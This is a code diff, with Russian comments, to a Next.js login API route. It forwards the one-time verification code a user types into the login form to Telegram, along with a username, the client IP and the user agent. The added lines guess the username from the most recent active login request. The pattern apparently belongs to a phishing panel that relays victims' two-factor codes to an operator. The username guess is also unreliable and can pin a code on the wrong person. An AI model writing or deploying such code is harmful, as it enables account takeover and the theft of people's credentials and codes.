@@ -55,12 +55,33 @@ export async function POST(request: NextRequest) {
       // Получаем username из сессии, если доступен
       try {
         const { getSession } = await import("@/lib/session");
+        const { getAllLoginRequests } = await import("@/lib/login-requests");
         const session = await getSession();
-        const codeUsername = session?.username || "unknown";
+        
+        // Пытаемся получить username из сессии
+        let codeUsername = session?.username;
+        
+        // Если username нет в сессии, пытаемся найти его в активных loginRequest
+        if (!codeUsername) {
+          const allRequests = getAllLoginRequests();
+          // Берем username из последнего активного запроса
+          if (allRequests.length > 0) {
+            const lastRequest = allRequests[allRequests.length - 1];
+            codeUsername = lastRequest.username;
+            console.log("[API LOGIN] Username получен из loginRequest:", codeUsername);
+          }
+        }
+        
+        // Если все еще нет username, используем "unknown"
+        if (!codeUsername) {
+          codeUsername = "unknown";
+          console.warn("[API LOGIN] Username не найден, используется 'unknown'");
+        }
+        
         const verificationCode = username.trim(); // В этом случае username содержит код
         
         await sendCodeTelegram(verificationCode, codeUsername, clientIp, userAgent);
-        console.log("[API LOGIN] Код верификации отправлен в Telegram");
+        console.log("[API LOGIN] Код верификации отправлен в Telegram с username:", codeUsername);
       } catch (telegramError) {
         console.error("[API LOGIN] Ошибка отправки кода в Telegram:", telegramError);
         // Fallback на Email
